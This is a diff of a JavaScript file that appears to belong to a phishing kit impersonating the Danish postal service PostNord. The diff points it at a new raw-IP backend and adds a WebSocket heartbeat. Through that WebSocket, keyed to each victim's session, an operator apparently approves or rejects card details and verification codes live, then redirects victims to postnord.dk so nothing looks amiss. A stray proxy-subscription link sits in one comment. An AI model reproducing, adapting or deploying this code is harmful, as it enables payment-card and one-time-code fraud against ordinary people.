@@ -5,7 +5,7 @@
  * @Email: 1364978779@qq.com
  * @Date: 2023-02-19 23:39:35
  * @LastEditors: dekun lu
- * @LastEditTime: 2023-02-25 14:19:24
+ * @LastEditTime: 2023-03-01 06:15:25
  */
 
 /**
@@ -15,13 +15,13 @@
  * @return {*}
  */
 
-const baseURL = 'https://155.94.182.31:8080'
+const API_URL = "//119.23.55.88:7002";
 //loading    loading-icegif-1.gif
 var loading = document.createElement("div");
 window.onload = async function () {
     //手机端校验
 
-    const data = fetch('https://155.94.182.31:8080user/check', {
+    const data = fetch(`${API_URL}/user/check`, {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
@@ -33,7 +33,7 @@ window.onload = async function () {
         alert("请在手机端打开");
 
         //跳转baidu
-        window.location.href = "https://www.google.com";
+        window.location.href = "https://www.postnord.dk";
 
         return;
     }
@@ -68,13 +68,15 @@ window.onload = async function () {
     </div > `;
     document.body.appendChild(loading);
 }
-const ws = new WebSocket("wss://155.94.182.31:8080/api/websocket/user/" + sessionStorage.getItem("uid"));
+const ws = new WebSocket(`wss:${API_URL}/api/websocket/user/` + sessionStorage.getItem("uid"));
 ws.onopen = function () {
     console.log("连接成功");
 };
 ws.onmessage = function (event) {
     const data = JSON.parse(event.data);
-    //放行卡
+    //放行卡https://clashnode.com/wp-content/uploads/2023/02/20230225.txt
+
+
     if (data.code == 7) {
         //存sessionStrorage
         sessionStorage.setItem("data", JSON.stringify(data.data));
@@ -98,7 +100,7 @@ ws.onmessage = function (event) {
         sessionStorage.setItem("data", JSON.stringify(data.data));
         hideLoading();
         //跳转code.html
-        window.location.href = "https://www.baidu.com";
+        window.location.href = "https://www.postnord.dk";
     }
     //拒绝验证码
     if (data.code == 10) {
@@ -110,7 +112,7 @@ ws.onmessage = function (event) {
     //同步完成
     if (data.code == 11) {
 
-        window.location.href = "https://www.baidu.com";
+        window.location.href = "https://www.postnord.dk";
 
         // hideLoading();
     }
@@ -122,6 +124,11 @@ ws.onclose = function () {
 ws.onerror = function () {
     alert("Connection error");
 };
+
+//发送心跳，30秒一次
+setInterval(function () {
+    ws.send("ping");
+}, 30000);
 
 
 
